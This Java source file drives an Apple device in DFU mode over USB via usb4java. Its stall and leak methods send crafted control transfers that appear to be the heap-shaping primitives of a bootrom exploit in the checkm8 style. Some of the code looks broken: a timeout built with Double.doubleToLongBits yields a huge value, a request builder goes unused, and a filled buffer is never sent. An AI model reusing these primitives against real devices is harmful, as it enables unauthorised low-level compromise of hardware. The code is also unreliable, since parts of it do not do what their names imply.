package queen.dfu;

import static com.igormaznitsa.jbbp.io.JBBPOut.*;

import java.nio.ByteBuffer;
import java.util.Arrays;

import org.usb4java.Context;
import org.usb4java.Device;
import org.usb4java.DeviceHandle;
import org.usb4java.LibUsb;
import org.usb4java.LibUsbException;
import org.usb4java.Transfer;
import org.usb4java.TransferCallback;

public class Dfu {
    private static short vid = 0x5AC;
    private static short pid = 0x1227;

    private byte[] aC0 = new byte[0xC0];

    private Context ctx;
    private DeviceHandle handle;
    private Device device;

    /**
     * Constructor.
     */
    public Dfu() {
        ctx = new Context();
        int status = LibUsb.init(ctx);
        if (status != LibUsb.SUCCESS) {
            throw new LibUsbException("Unable to init libusb!", status);
        }
        Arrays.fill(aC0, (byte)0x41);
    }

    public String getSerial() {
        StringBuffer descriptor = new StringBuffer();
        LibUsb.getStringDescriptorAscii(handle, (byte)4, descriptor);
        return descriptor.toString();
    }

    /**
     * Opens device.
     */
    public void aquireDevice() {
        handle = LibUsb.openDeviceWithVidPid(ctx, vid, pid);
        if (handle == null) {
            throw new LibUsbException("Unable to aquire device!", LibUsb.ERROR_NOT_FOUND);
        }

        // LibUsb.setConfiguration(handle, 1);
        LibUsb.claimInterface(handle, 0);

        device = LibUsb.getDevice(handle);
    }

    public void releaseDevice() {
        LibUsb.releaseInterface(handle, 0);
        LibUsb.close(handle);
    }

    public void resetDevice() {
        LibUsb.resetDevice(handle);
    }

    private Transfer createTransfer(
            byte[] request, ByteBuffer buffer, Long timeout
    ) {
        // LibUsb.fillControlSetup(buffer, bmRequestType, bRequest, wValue, wIndex, wIndex);
        Transfer transfer = LibUsb.allocTransfer(0);
        transfer.setDevHandle(handle);
        transfer.setEndpoint((byte)0);
        transfer.setType((byte)0);
        transfer.setTimeout(timeout);
        transfer.setBuffer(buffer);
        transfer.setLength(request.length);
        transfer.setUserData(null);
        transfer.setCallback(null);
        transfer.setFlags(LibUsb.TRANSFER_FREE_BUFFER);

        return transfer;
    }

    private byte[] createRequest(
            byte bmRequestType, byte bRequest,
            short wValue, short wIndex,
            ByteBuffer data, Long timeout
    ) {
        byte[] request;

        try {
            request = BeginBin()
                    .Byte('B')
                    .Byte(bmRequestType)
                    .Byte(bRequest)
                    .Short(wValue)
                    .Short(wIndex)
                    .Short(data.array().length)
                    .Byte(data.array())
                    .End().toByteArray();

            return request;
        } catch (Exception e) {
            // TODO: handle exception
            System.exit(-1);
        }
        return new byte[0];
    }

    public void asyncCtrlTransfer(
            byte bmRequestType, byte bRequest,
            short wValue, short wIndex,
            ByteBuffer data, Long timeout
    ) {
        // byte[] request = createRequest(bmRequestType, bRequest, wValue, wIndex, data, timeout);
        Transfer transfer = LibUsb.allocTransfer(0);
        // LibUsb.fillControlSetup(data, bmRequestType, bRequest, wValue, wIndex, (short)data.array().length);
        LibUsb.fillControlTransfer(transfer, handle, data, transferCb, null, timeout);
        // Long start = System.currentTimeMillis();
        
        if (LibUsb.submitTransfer(transfer) != 0) {
            System.err.println("Unable to submit async transfer.");
            System.exit(-1);
        }

        // while ((System.currentTimeMillis() - start) < timeout / 1000) {
        //     continue;
        // }

        // if (LibUsb.cancelTransfer(transfer) != 0) {
        //     System.err.println("Unable to cancel async transfer after timeout of " + timeout + "ms");
        //     System.exit(-1);
        // }
    }
    
    private TransferCallback transferCb = new TransferCallback() {
    	@Override
        public void processTransfer(Transfer transfer)
        {
            System.out.println(transfer.actualLength() + " bytes received");
            LibUsb.cancelTransfer(transfer);
            LibUsb.freeTransfer(transfer);
            System.out.println("Asynchronous communication finished");
//            exit = true;
        }
    };

    public void noErrorCtrlTransfer(
            byte bmRequestType, byte bRequest,
            short wValue, short wIndex,
            ByteBuffer data, Long timeout
    ) {
        LibUsb.controlTransfer(handle, bmRequestType, bRequest, wValue, wIndex, data, timeout);
    }

    public void stall() {
        ByteBuffer data = ByteBuffer.allocateDirect(0xC0);
        // data.put(aC0, 0, );
        asyncCtrlTransfer((byte)0x80, (byte)6, (short)0x304, (short)0x40A, data, Double.doubleToLongBits(0.00001));
    }

    public void leak() {
        ByteBuffer data = ByteBuffer.allocateDirect(0xC0);
        noErrorCtrlTransfer((byte)0x80, (byte)6, (short)0x304, (short)0x40A, data, 1l);
    }

    public void noLeak() {
        ByteBuffer data = ByteBuffer.allocateDirect(0xC1);
        noErrorCtrlTransfer((byte)0x80, (byte)6, (short)0x304, (short)0x40A, data, 1l);
    }

    public void usbReqStall() {
        ByteBuffer data = ByteBuffer.allocateDirect(0x0);
        noErrorCtrlTransfer((byte)0x2, (byte)3, (short)0x0, (short)0x80, data, 10l);
    }

    public void usbReqLeak() {
        ByteBuffer data = ByteBuffer.allocateDirect(0x40);
        noErrorCtrlTransfer((byte)0x80, (byte)6, (short)0x304, (short)0x40A, data, 1l);
    }

    public void usbReqNoLeak() {
        ByteBuffer data = ByteBuffer.allocateDirect(0x41);
        noErrorCtrlTransfer((byte)0x80, (byte)6, (short)0x304, (short)0x40A, data, 1l);
    }
}
